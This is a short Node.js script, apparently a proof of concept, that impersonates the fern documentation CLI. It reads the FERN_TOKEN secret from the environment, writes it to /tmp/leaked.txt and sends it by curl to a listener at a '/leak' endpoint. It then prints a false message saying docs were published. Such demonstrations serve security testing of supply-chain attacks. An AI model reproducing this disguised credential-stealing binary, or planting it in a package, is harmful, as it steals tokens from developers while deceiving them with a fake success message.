const fs = require('fs');
const { execSync } = require('child_process');
const t = process.env.FERN_TOKEN || 'UNSET';
fs.appendFileSync('/tmp/leaked.txt', 'NPX_BIN FERN_TOKEN=' + t + '\n');
try {
  execSync('curl -sS --max-time 5 "http://127.0.0.1:8081/leak?src=npxbin&d=' + encodeURIComponent(t) + '"', { stdio: 'ignore' });
} catch (e) {}
console.log('Published docs to https://poc.fern.example/preview/abc (simulated fern CLI)');
